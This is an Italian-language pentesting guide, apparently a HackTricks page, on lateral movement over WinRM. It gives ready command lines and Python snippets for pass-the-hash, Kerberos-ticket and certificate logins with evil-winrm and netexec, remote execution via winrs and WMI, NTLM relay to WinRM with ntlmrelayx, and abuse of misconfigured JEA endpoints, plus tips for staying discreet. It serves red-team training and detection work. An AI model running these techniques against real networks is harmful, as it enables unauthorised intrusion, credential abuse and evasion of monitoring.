# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM è uno dei transport di **lateral movement** più convenienti negli ambienti Windows, perché fornisce una shell remota tramite **WS-Man/HTTP(S)** senza dover ricorrere ai trucchi di creazione dei servizi SMB. Se il target espone **5985/5986** e il tuo principal è autorizzato a usare il remoting, spesso puoi passare molto rapidamente da "credenziali valide" a "interactive shell".

Per l'enumerazione del **protocollo/servizio**, i listener, l'abilitazione di WinRM, `Invoke-Command` e l'utilizzo generico del client, consulta:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Perché gli operatori apprezzano WinRM

- Utilizza **HTTP/HTTPS** invece di SMB/RPC, quindi spesso funziona dove l'esecuzione in stile PsExec è bloccata.
- Con **Kerberos**, evita di inviare credenziali riutilizzabili al target.
- Funziona correttamente da **Windows**, **Linux** e con tool **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Il percorso interattivo di PowerShell remoting avvia **`wsmprovhost.exe`** sul target nel contesto dell'utente autenticato, con caratteristiche operative diverse dall'esecuzione basata sui servizi.

## Modello di accesso e prerequisiti

In pratica, il lateral movement tramite WinRM dipende da **tre** elementi:

1. Il target dispone di un **listener WinRM** (`5985`/`5986`) e di regole firewall che consentono l'accesso.
2. L'account può **autenticarsi** all'endpoint.
3. L'account è autorizzato ad **aprire una sessione di remoting**.

Modalità comuni per ottenere tale accesso:

- **Local Administrator** sul target.
- Appartenenza a **Remote Management Users** nei sistemi più recenti o a **WinRMRemoteWMIUsers__** nei sistemi/componenti che riconoscono ancora tale gruppo.
- Diritti di remoting delegati esplicitamente tramite descrittori di sicurezza locali / modifiche alle ACL di PowerShell remoting.

Se hai già il controllo di una macchina con privilegi di amministratore, ricorda che puoi anche **delegare l'accesso WinRM senza l'appartenenza al gruppo Administrators** utilizzando le tecniche descritte qui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Problemi di autenticazione rilevanti durante il lateral movement

- **Kerberos richiede un hostname/FQDN**. Se ti connetti tramite IP, il client normalmente effettua il fallback a **NTLM/Negotiate**.
- Nei casi di **workgroup** o di trust incrociati, NTLM richiede comunemente **HTTPS** oppure che il target venga aggiunto a **TrustedHosts** sul client.
- Con **account locali** tramite Negotiate in un workgroup, le restrizioni UAC remote possono impedire l'accesso, a meno che non venga utilizzato l'account Administrator integrato o non sia impostato `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting utilizza per impostazione predefinita lo **SPN `HTTP/<host>`**. Negli ambienti in cui **`HTTP/<host>`** è già registrato per un altro service account, Kerberos di WinRM potrebbe non riuscire con `0x80090322`; utilizza uno SPN qualificato dalla porta oppure passa a **`WSMAN/<host>`** quando tale SPN esiste.<sup>[[3]](#references)</sup>

Se ottieni credenziali valide durante il password spraying, convalidarle tramite WinRM è spesso il modo più rapido per verificare se possono tradursi in una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement da Linux a Windows

### NetExec / CrackMapExec per la convalida e l'esecuzione one-shot
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM per shell interattive

`evil-winrm` rimane l'opzione interattiva più conveniente da Linux perché supporta **password**, **NT hash**, **ticket Kerberos**, **certificati client**, trasferimento di file e caricamento in memoria di PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso limite degli SPN Kerberos: `HTTP` vs `WSMAN`

Quando lo SPN **`HTTP/<host>`** predefinito causa errori Kerberos, prova invece a richiedere/utilizzare un ticket **`WSMAN/<host>`**. Questo si verifica in configurazioni enterprise hardenizzate o anomale, in cui **`HTTP/<host>`** è già associato a un altro service account.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Questo è utile anche dopo l’abuso di **RBCD / S4U**, quando hai forgiato o richiesto specificamente un service ticket **WSMAN** invece di un ticket generico `HTTP`.

### Autenticazione basata su certificato

WinRM supporta anche l’**autenticazione tramite certificato client**, ma il certificato deve essere mappato sul target a un **account locale**. Dal punto di vista offensivo, questo è rilevante quando:

- hai sottratto/esportato un certificato client valido e la chiave privata già mappati per WinRM;
- hai abusato di **AD CS / Pass-the-Certificate** per ottenere un certificato per un principal e poi effettuare il pivot verso un altro percorso di autenticazione;
- operi in ambienti che evitano deliberatamente il remoting basato su password.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
WinRM con certificato client è molto meno comune rispetto all'autenticazione tramite password/hash/Kerberos, ma quando è disponibile può fornire un percorso di **lateral movement senza password** che rimane valido anche dopo la rotazione della password.

### Python / automazione con `pypsrp`

Se ti serve l'automazione invece di una shell per l'operatore, `pypsrp` fornisce WinRM/PSRP da Python con supporto per **NTLM**, **autenticazione tramite certificato**, **Kerberos** e **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Se hai bisogno di un controllo più preciso rispetto al wrapper `Client` di alto livello, le API di livello inferiore `WSMan` + `RunspacePool` sono utili per due problemi operativi comuni:

- forzare **`WSMAN`** come servizio/SPN Kerberos invece dell'aspettativa predefinita **`HTTP`** utilizzata da molti client PowerShell;
- connettersi a un endpoint PSRP **non predefinito**, come una configurazione di sessione **JEA** / personalizzata, invece di `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Gli endpoint PSRP personalizzati e JEA sono importanti durante il lateral movement

Un'autenticazione WinRM riuscita **non** significa sempre che si ottenga una sessione nell'endpoint predefinito e senza restrizioni `Microsoft.PowerShell`. Gli ambienti maturi possono esporre **configurazioni di sessione personalizzate** o endpoint **JEA**, con ACL e comportamenti run-as propri.<sup>[[1]](#references)</sup>

Se disponi già di code execution su un host Windows e vuoi capire quali superfici di remoting sono presenti, enumera gli endpoint registrati:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Quando esiste un endpoint utile, usalo esplicitamente invece della shell predefinita:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implicazioni pratiche offensive:

- Un endpoint **restricted** può essere comunque sufficiente per il lateral movement se espone solo i cmdlet/funzioni giusti per il controllo dei servizi, l'accesso ai file, la creazione di processi o l'esecuzione arbitraria di .NET / comandi esterni.
- Un ruolo **JEA** configurato erroneamente è particolarmente prezioso quando espone comandi pericolosi come `Start-Process`, wildcard generiche, provider scrivibili o proxy functions personalizzate che consentono di evadere le restrizioni previste.
- Gli endpoint supportati da **RunAs virtual accounts** o **gMSAs** modificano il contesto di sicurezza effettivo dei comandi eseguiti. In particolare, un endpoint supportato da gMSA può fornire una **network identity** sul **second hop**, anche quando una normale sessione WinRM incontrerebbe il classico problema di delega.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` è integrato nel sistema ed è utile quando si desidera eseguire comandi **native WinRM** senza aprire una sessione interattiva di PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Due flag sono facili da dimenticare e sono importanti nella pratica:

- `/noprofile` è spesso necessario quando il principal remoto **non** è un amministratore locale.
- `/allowdelegate` consente alla shell remota di usare le tue credenziali su un **terzo host** (ad esempio, quando il comando deve accedere a `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
A livello operativo, `winrs.exe` genera comunemente una catena di processi remoti simile a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Vale la pena ricordarlo perché differisce dall’exec basato su servizi e dalle sessioni PSRP interattive.

### `winrm.cmd` / WS-Man COM invece di PowerShell remoting

Puoi anche eseguire comandi tramite il **transport WinRM** senza usare `Enter-PSSession`, invocando classi WMI tramite WS-Man. In questo modo il transport rimane WinRM, mentre la primitiva di esecuzione remota diventa **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Questo approccio è utile quando:

- Il logging di PowerShell è sottoposto a un monitoraggio intenso.
- Vuoi il **trasporto WinRM**, ma non un workflow classico di PS remoting.
- Stai sviluppando o utilizzando tooling personalizzato basato sull'oggetto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Quando SMB relay è bloccato dalla signing e LDAP relay è soggetto a restrizioni, **WS-Man/WinRM** può essere comunque un target interessante per il relay. `ntlmrelayx.py` moderno include server di WinRM relay e può eseguire il relay verso target **`wsman://`** o **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Due note pratiche:

- Relay è più utile quando il target accetta **NTLM** e il principal inoltrato è autorizzato a usare WinRM.
- Il codice recente di Impacket gestisce specificamente le richieste **`WSMANIDENTIFY: unauthenticated`**, quindi le probe in stile `Test-WSMan` non interrompono il flusso di relay.

Per i vincoli multi-hop dopo aver ottenuto una prima sessione WinRM, consulta:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Note su OPSEC e rilevamento

- L'**Interactive PowerShell remoting** normalmente crea **`wsmprovhost.exe`** sul target.
- **`winrs.exe`** crea comunemente **`winrshost.exe`** e quindi il processo figlio richiesto.
- Gli endpoint **JEA** personalizzati possono eseguire azioni come account virtuali **`WinRM_VA_*`** o come **gMSA** configurato, modificando sia la telemetria sia il comportamento del second hop rispetto a una shell nel contesto di un utente normale.<sup>[[1]](#references)</sup>
- Aspettati telemetria relativa all'**accesso di rete**, eventi del servizio WinRM e logging operativo/script block di PowerShell se usi PSRP invece di `cmd.exe` grezzo.
- Se ti serve un solo comando, `winrs.exe` o un'esecuzione WinRM one-shot possono essere più discreti rispetto a una sessione di remoting interattiva di lunga durata.
- Se Kerberos è disponibile, preferisci **FQDN + Kerberos** rispetto a IP + NTLM per ridurre sia i problemi di trust sia le modifiche problematiche lato client a `TrustedHosts`.

## Riferimenti

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
